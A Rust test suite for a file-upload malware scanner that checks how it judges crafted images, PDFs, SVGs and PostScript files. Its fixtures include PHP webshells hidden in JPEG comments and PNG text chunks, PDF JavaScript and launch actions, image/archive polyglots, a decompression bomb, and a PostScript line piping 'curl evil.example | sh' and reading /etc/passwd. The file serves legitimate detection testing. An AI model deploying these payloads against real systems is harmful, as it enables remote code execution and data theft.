use malmal::{FileType, HashList, Limits, Policy, Report, ScanHints, Scanner, Verdict};
use miniz_oxide::deflate::compress_to_vec_zlib;

/// Enough of a PNG to be detected as one, but not a complete image.
const PNG_HEADER: &[u8] = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR";

fn crc32(data: &[u8]) -> u32 {
    let mut crc = !0u32;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            crc = if crc & 1 != 0 {
                0xEDB8_8320 ^ (crc >> 1)
            } else {
                crc >> 1
            };
        }
    }
    !crc
}

fn png_chunk(kind: &[u8; 4], body: &[u8]) -> Vec<u8> {
    let mut out = (body.len() as u32).to_be_bytes().to_vec();
    out.extend_from_slice(kind);
    out.extend_from_slice(body);
    out.extend_from_slice(&crc32(&out[4..]).to_be_bytes());
    out
}

/// A structurally valid PNG with `extra` chunks between IHDR and IDAT.
fn png(width: u32, height: u32, extra: &[u8]) -> Vec<u8> {
    let mut header = width.to_be_bytes().to_vec();
    header.extend_from_slice(&height.to_be_bytes());
    header.extend_from_slice(b"\x08\x06\0\0\0");
    let mut data = b"\x89PNG\r\n\x1a\n".to_vec();
    data.extend(png_chunk(b"IHDR", &header));
    data.extend_from_slice(extra);
    data.extend(png_chunk(b"IDAT", b"\x78\x9c\x63\x00\x00\x00\x01\x00\x01"));
    data.extend(png_chunk(b"IEND", b""));
    data
}

/// A structurally valid JPEG with `extra` segments after the JFIF header.
fn jpeg(extra: &[u8]) -> Vec<u8> {
    let mut data = b"\xFF\xD8".to_vec();
    data.extend_from_slice(b"\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00");
    data.extend_from_slice(extra);
    data.extend_from_slice(b"\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00");
    data.extend_from_slice(b"\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00\xD2\xCF\x20");
    data.extend_from_slice(b"\xFF\xD9");
    data
}

fn jpeg_comment(text: &[u8]) -> Vec<u8> {
    let mut segment = b"\xFF\xFE".to_vec();
    segment.extend_from_slice(&(text.len() as u16 + 2).to_be_bytes());
    segment.extend_from_slice(text);
    segment
}

fn gif() -> Vec<u8> {
    let mut data = b"GIF89a\x01\x00\x01\x00\x00\x00\x00".to_vec();
    data.extend_from_slice(b"\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4C\x01\x00\x3B");
    data
}

fn hints<'a>(filename: &'a str, content_type: &'a str) -> ScanHints<'a> {
    ScanHints {
        filename: Some(filename),
        content_type: Some(content_type),
    }
}

fn scan(data: &[u8]) -> Report {
    Scanner::builder()
        .build()
        .scan_bytes(data, ScanHints::default())
}

fn codes(report: &Report) -> Vec<&'static str> {
    report.findings.iter().map(|f| f.code).collect()
}

#[test]
fn well_formed_images_are_clean() {
    let scanner = Scanner::builder().build();
    let report = scanner.scan_bytes(&png(4, 3, b""), hints("logo.png", "image/png"));
    assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);
    assert_eq!(report.detected_type, FileType::Png);
    assert_eq!(report.declared_types, [FileType::Png]);

    for image in [jpeg(b""), jpeg(&jpeg_comment(b"shot on a phone")), gif()] {
        let report = scan(&image);
        assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);
    }
}

#[test]
fn eicar_is_blocked_by_hashlist() {
    // Assembled at runtime so antivirus does not quarantine this source file.
    let eicar = [
        r"X5O!P%@AP[4\PZX54(P^)7CC)7}$",
        "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    ]
    .concat();
    let list = HashList::parse(
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f  eicar.com\n",
    )
    .unwrap();
    let report = Scanner::builder()
        .hashlist(list)
        .build()
        .scan_bytes(eicar.as_bytes(), ScanHints::default());
    assert_eq!(report.verdict, Verdict::Malicious);
    assert!(report.has("hash.blocklisted"), "{:?}", report.findings);
}

#[test]
fn executable_disguised_as_image() {
    let report = Scanner::builder()
        .build()
        .scan_bytes(b"\x7fELF\x02\x01\x01\0", hints("photo.jpg", "image/jpeg"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(
        codes(&report),
        ["type.mismatch", "type.mismatch", "type.executable"]
    );
}

#[test]
fn webshell_in_jpeg_comment() {
    let report = scan(&jpeg(&jpeg_comment(b"<?php system($_GET['c']); ?>")));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["payload.php"]);
    assert_eq!(report.findings[0].offset, Some(24));

    let report = scan(&jpeg(&jpeg_comment(b"<?=`$_GET[0]`?>")));
    assert_eq!(codes(&report), ["payload.php"]);
}

#[test]
fn webshell_in_compressed_png_text() {
    let mut body = b"Comment\0\0".to_vec();
    body.extend(compress_to_vec_zlib(b"<?php eval($_POST[1]); ?>", 6));
    let report = scan(&png(4, 3, &png_chunk(b"zTXt", &body)));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["image.metadata.payload"]);
}

#[test]
fn script_markup_is_flagged_in_images_only() {
    let mut image = gif();
    image.extend_from_slice(b"<script>alert(1)</script>");
    let report = scan(&image);
    assert_eq!(
        codes(&report),
        ["payload.script", "image.trailing_data", "image.polyglot"]
    );
    assert_eq!(report.verdict, Verdict::Malicious);

    let pdf = b"%PDF-1.7\n% <script> mentioned in a comment\n";
    assert!(!scan(pdf).has("payload.script"));
}

#[test]
fn appended_data_is_suspicious() {
    let mut image = jpeg(b"");
    let end = image.len() as u64;
    image.extend_from_slice(b"some appended notes");
    let report = scan(&image);
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert_eq!(codes(&report), ["image.trailing_data"]);
    assert_eq!(report.findings[0].offset, Some(end));

    // Padding and Multi-Picture Format frames are not trailing data.
    let mut padded = jpeg(b"");
    padded.extend_from_slice(&[0; 64]);
    padded.extend(jpeg(b""));
    padded.extend_from_slice(&[0; 64]);
    assert_eq!(scan(&padded).verdict, Verdict::Clean);
}

#[test]
fn image_archive_polyglot() {
    let empty_zip = b"PK\x05\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

    let mut appended = png(4, 3, b"");
    appended.extend_from_slice(empty_zip);
    let report = scan(&appended);
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["image.trailing_data", "image.polyglot"]);

    // The archive can also hide where the image format does not look: here
    // the end record sits inside a JPEG comment and its ZIP comment swallows
    // the rest of the image.
    let rest_len = jpeg(b"").len() - 20;
    let mut record = empty_zip.to_vec();
    record[20..].copy_from_slice(&(rest_len as u16).to_le_bytes());
    let report = scan(&jpeg(&jpeg_comment(&record)));
    assert_eq!(codes(&report), ["image.polyglot"]);
}

#[test]
fn pdf_header_inside_image() {
    let report = scan(&jpeg(&jpeg_comment(b"%PDF-1.4\n1 0 obj")));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["image.polyglot"]);
}

#[test]
fn malformed_and_oversized_images() {
    let report = scan(PNG_HEADER);
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert_eq!(codes(&report), ["image.malformed"]);

    let report = scan(&png(100_000, 100_000, b""));
    assert_eq!(codes(&report), ["image.pixel_bomb"]);

    let report = scan(&png(0, 3, b""));
    assert_eq!(codes(&report), ["image.malformed"]);
}

/// Every prefix and every single-byte corruption of a valid image must be
/// handled without panicking.
#[test]
fn corrupted_images_never_panic() {
    let mut webp = b"RIFF\x18\0\0\0WEBPVP8 \x0B\0\0\0".to_vec();
    webp.extend_from_slice(b"\x00\x00\x00\x9D\x01\x2A\x10\x00\x08\x00\xAA\x00");
    let mut bmp = b"BM\x3A\0\0\0\0\0\0\0\0\0\0\0\x28\0\0\0\x05\0\0\0\x07\0\0\0".to_vec();
    bmp.resize(58, 0);
    let mut tiff = b"II*\0\x08\0\0\0\x03\0".to_vec();
    tiff.extend_from_slice(b"\x00\x01\x03\0\x01\0\0\0\x06\0\0\0");
    tiff.extend_from_slice(b"\x11\x01\x04\0\x01\0\0\0\x32\0\0\0");
    tiff.extend_from_slice(b"\x17\x01\x04\0\x01\0\0\0\x04\0\0\0");
    tiff.extend_from_slice(b"\0\0\0\0\x01\x02\x03\x04");

    // 2x2, one channel, one image resource block, raw pixels.
    let mut psd = b"8BPS\0\x01\0\0\0\0\0\0\0\x01\0\0\0\x02\0\0\0\x02\0\x08\0\x01".to_vec();
    psd.extend_from_slice(b"\0\0\0\0\0\0\0\x10\x38BIM\x04\x04\0\0\0\0\0\x03abc\0");
    psd.extend_from_slice(b"\0\0\0\0\0\0\x01\x02\x03\x04");

    let scanner = Scanner::builder().build();
    for sample in [jpeg(b""), png(4, 3, b""), gif(), webp, bmp, tiff, psd] {
        assert_eq!(scan(&sample).verdict, Verdict::Clean, "{sample:?}");
        for len in 0..sample.len() {
            scanner.scan_bytes(&sample[..len], ScanHints::default());
        }
        for index in 0..sample.len() {
            for value in [0x00, 0x01, 0x7F, 0x80, 0xFF] {
                let mut corrupted = sample.clone();
                corrupted[index] = value;
                scanner.scan_bytes(&corrupted, ScanHints::default());
            }
        }
    }
}

const CLEAN_SVG: &str =
    r#"<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>"#;
const SCRIPTED_SVG: &str =
    r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;

fn gzip(data: &[u8]) -> Vec<u8> {
    let mut out = b"\x1F\x8B\x08\0\0\0\0\0\0\x03".to_vec();
    out.extend(miniz_oxide::deflate::compress_to_vec(data, 6));
    out.extend_from_slice(&[0; 8]);
    out
}

#[test]
fn svg_with_active_content() {
    let scanner = Scanner::builder().build();
    let report = scanner.scan_bytes(CLEAN_SVG.as_bytes(), hints("icon.svg", "image/svg+xml"));
    assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);

    let report = scanner.scan_bytes(SCRIPTED_SVG.as_bytes(), hints("icon.svg", "image/svg+xml"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["svg.script"]);

    // An SVG uploaded under an image name is still analyzed as SVG.
    let report = scanner.scan_bytes(SCRIPTED_SVG.as_bytes(), hints("photo.png", "image/png"));
    assert_eq!(
        codes(&report),
        ["type.mismatch", "type.mismatch", "svg.script"]
    );
}

#[test]
fn gzipped_svg_is_unwrapped() {
    let scanner = Scanner::builder().build();
    let report = scanner.scan_bytes(
        &gzip(CLEAN_SVG.as_bytes()),
        hints("icon.svgz", "image/svg+xml"),
    );
    assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);
    assert_eq!(report.detected_type, FileType::Svg);

    let report = scan(&gzip(SCRIPTED_SVG.as_bytes()));
    assert_eq!(codes(&report), ["svg.script"]);

    // Any other gzip content is not an accepted upload.
    let report = scan(&gzip(b"just some text"));
    assert_eq!(report.detected_type, FileType::Gzip);
    assert_eq!(codes(&report), ["type.not_allowed"]);

    let limits = Limits {
        max_decompressed: 1000,
        ..Limits::default()
    };
    let bomb = gzip(&vec![b' '; 1_000_000]);
    let report = Scanner::builder()
        .limits(limits)
        .build()
        .scan_bytes(&bomb, ScanHints::default());
    assert!(report.has("limit.decompression"), "{:?}", report.findings);
}

fn pdf(objects: &[&[u8]]) -> Vec<u8> {
    let mut out = b"%PDF-1.7\n".to_vec();
    for (index, body) in objects.iter().enumerate() {
        out.extend_from_slice(format!("{} 0 obj\n", index + 1).as_bytes());
        out.extend_from_slice(body);
        out.extend_from_slice(b"\nendobj\n");
    }
    out.extend_from_slice(b"trailer\n<< /Root 1 0 R >>\nstartxref\n0\n%%EOF\n");
    out
}

fn pdf_stream(entries: &str, data: &[u8]) -> Vec<u8> {
    let mut out = format!("<< {entries} /Length {} >>\nstream\n", data.len()).into_bytes();
    out.extend_from_slice(data);
    out.extend_from_slice(b"\nendstream");
    out
}

const PDF_CATALOG: &[u8] = b"<< /Type /Catalog /Pages 2 0 R >>";
const PDF_PAGES: &[u8] = b"<< /Type /Pages /Kids [] /Count 0 >>";

#[test]
fn pdf_with_active_content() {
    let scanner = Scanner::builder().build();
    let clean = pdf(&[PDF_CATALOG, PDF_PAGES]);
    let report = scanner.scan_bytes(&clean, hints("report.pdf", "application/pdf"));
    assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);

    // Illustrator files are PDFs and get the same analysis.
    let scripted = pdf(&[
        PDF_CATALOG,
        PDF_PAGES,
        b"<< /S /JavaScript /JS (app.alert(1)) >>",
    ]);
    let report = scanner.scan_bytes(&scripted, hints("logo.ai", "application/postscript"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["pdf.javascript"]);

    let packed = pdf_stream(
        "/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode",
        &compress_to_vec_zlib(b"9 0 << /S /Launch /F (calc.exe) >>", 6),
    );
    assert_eq!(
        codes(&scan(&pdf(&[PDF_CATALOG, PDF_PAGES, &packed]))),
        ["pdf.launch"]
    );
}

#[test]
fn pdf_attachments_are_scanned_recursively() {
    let attach = |content: &[u8]| {
        let file = pdf_stream(
            "/Type /EmbeddedFile /Filter /FlateDecode",
            &compress_to_vec_zlib(content, 6),
        );
        pdf(&[PDF_CATALOG, PDF_PAGES, &file])
    };

    let report = scan(&attach(b"quarterly figures, plain text"));
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert_eq!(codes(&report), ["pdf.embedded_file"]);

    let report = scan(&attach(b"\x7fELF\x02\x01\x01\0"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["pdf.embedded_file", "type.executable"]);

    let report = scan(&attach(SCRIPTED_SVG.as_bytes()));
    assert_eq!(codes(&report), ["pdf.embedded_file", "svg.script"]);

    // A PDF inside a PDF inside a PDF: found while depth allows, and
    // reported as a limit once it does not.
    let inner = pdf(&[PDF_CATALOG, PDF_PAGES, b"<< /S /JavaScript /JS (x) >>"]);
    let nested = attach(&attach(&inner));
    assert_eq!(
        codes(&scan(&nested)),
        ["pdf.embedded_file", "pdf.javascript"]
    );

    let limits = Limits {
        max_depth: 1,
        ..Limits::default()
    };
    let report = Scanner::builder()
        .limits(limits)
        .build()
        .scan_bytes(&nested, ScanHints::default());
    assert_eq!(codes(&report), ["pdf.embedded_file", "limit.depth"]);
}

/// Every prefix and every single-byte corruption of a PDF and an SVG must
/// be handled without panicking.
#[test]
fn corrupted_documents_never_panic() {
    let packed = pdf_stream(
        "/Type /ObjStm /N 1 /First 4 /Filter [/ASCIIHexDecode /FlateDecode] /DecodeParms [null << /Predictor 12 /Columns 4 >>]",
        b"789c6360606068606060000000ffff0300001100043e",
    );
    let lzw = pdf_stream(
        "/Type /EmbeddedFile /Filter [/ASCII85Decode /LZWDecode /RunLengthDecode]",
        b"J,g]g+e/h_!_gCtO=0f)$P%cIi8Zdfc5&3j_8$7g.@L`YKUJNGBP~>",
    );
    let document = pdf(&[
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /AA << /O 5 0 R >> >>",
        PDF_PAGES,
        &packed,
        &lzw,
        b"<< /S /J#61vaScript /JS (app.alert\\(1\\)) /Next [6 0 R <AB> -1.5 true null] >>",
    ]);
    let svg = br#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "b">]>
<svg xmlns="http://www.w3.org/2000/svg"><style>a{fill:url(#b)}</style>
<a href="data:image/svg+xml;base64,PHN2Zy8+" onclick="&a;">x&#65;</a></svg>"#;

    let scanner = Scanner::builder().build();
    for sample in [document, svg.to_vec()] {
        for len in 0..sample.len() {
            scanner.scan_bytes(&sample[..len], ScanHints::default());
        }
        for index in 0..sample.len() {
            for value in [0x00, b'<', b'/', b'9', b'(', 0xFF] {
                let mut corrupted = sample.clone();
                corrupted[index] = value;
                scanner.scan_bytes(&corrupted, ScanHints::default());
            }
        }
    }
}

#[test]
fn postscript_with_dangerous_operators() {
    let scanner = Scanner::builder().build();
    let clean = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 10 10\nnewpath 0 0 moveto 10 10 lineto stroke\nshowpage\n";
    let report = scanner.scan_bytes(clean, hints("logo.eps", "application/postscript"));
    assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);
    let report = scanner.scan_bytes(clean, hints("logo.ai", "application/illustrator"));
    assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);

    let pipe = b"%!PS\n(%pipe%curl evil.example | sh) (r) file\n";
    let report = scanner.scan_bytes(pipe, hints("logo.eps", "application/postscript"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["ps.pipe", "ps.file_access"]);

    // No `%!` header: unrecognizable, but Ghostscript would still run it.
    let headerless = b"userdict /x (/etc/passwd) (r) file put\n";
    let report = scanner.scan_bytes(headerless, hints("logo.eps", "application/postscript"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert!(report.has("ps.file_access"), "{:?}", report.findings);
}

#[test]
fn double_extension_is_flagged() {
    let report = Scanner::builder()
        .build()
        .scan_bytes(&jpeg(b""), hints("shell.php.jpg", "image/jpeg"));
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["name.dangerous_extension"]);
}

#[test]
fn illustrator_files_may_be_pdf_or_postscript() {
    let scanner = Scanner::builder().build();
    for content in [&pdf(&[PDF_CATALOG, PDF_PAGES])[..], b"%!PS-Adobe-3.0\n"] {
        let report = scanner.scan_bytes(content, hints("logo.ai", "application/postscript"));
        assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.findings);
    }
    let report = scanner.scan_bytes(PNG_HEADER, hints("logo.ai", "application/postscript"));
    assert!(report.has("type.mismatch"));
}

#[test]
fn unknown_and_disallowed_types() {
    let report = scan(b"plain text");
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert_eq!(codes(&report), ["type.unknown"]);

    let strict = Scanner::builder().policy(Policy::strict()).build();
    let report = strict.scan_bytes(b"PK\x03\x04\x14\0", ScanHints::default());
    assert_eq!(report.verdict, Verdict::Malicious);
    assert_eq!(codes(&report), ["type.not_allowed"]);
}

#[test]
fn oversized_input_is_never_clean() {
    let limits = Limits {
        max_file_size: 16,
        ..Limits::default()
    };
    let scanner = Scanner::builder().limits(limits).build();
    let data = png(4, 3, b"");

    let report = scanner.scan_bytes(&data, ScanHints::default());
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert!(report.has("limit.size"), "{:?}", report.findings);
    assert_eq!(report.size, data.len() as u64);

    let report = scanner
        .scan_reader(&data[..], ScanHints::default())
        .unwrap();
    assert!(report.has("limit.size"), "{:?}", report.findings);
    assert_eq!(report.size, 17);
}

#[cfg(feature = "yara")]
#[test]
fn yara_rules_add_findings() {
    let rules = malmal::YaraRules::compile([
        r#"rule marker { strings: $a = "MALMAL-TEST-MARKER" condition: $a }"#,
    ])
    .unwrap();
    let scanner = Scanner::builder().yara(rules).build();

    let mut image = gif();
    assert_eq!(
        scanner.scan_bytes(&image, ScanHints::default()).verdict,
        Verdict::Clean
    );
    image.extend_from_slice(b"\0\0MALMAL-TEST-MARKER");
    let report = scanner.scan_bytes(&image, ScanHints::default());
    assert_eq!(report.verdict, Verdict::Malicious);
    assert!(report.has("yara.match"), "{:?}", report.findings);
    assert!(report.findings.iter().any(|f| f.message.contains("marker")));

    // A compressed attachment is matched on what it unpacks to.
    let attachment = pdf_stream(
        "/Type /EmbeddedFile /Filter /FlateDecode",
        &compress_to_vec_zlib(b"notes MALMAL-TEST-MARKER", 6),
    );
    let report = scanner.scan_bytes(
        &pdf(&[PDF_CATALOG, PDF_PAGES, &attachment]),
        ScanHints::default(),
    );
    assert!(report.has("yara.match"), "{:?}", report.findings);

    assert!(malmal::YaraRules::compile(["rule broken {"]).is_err());
}
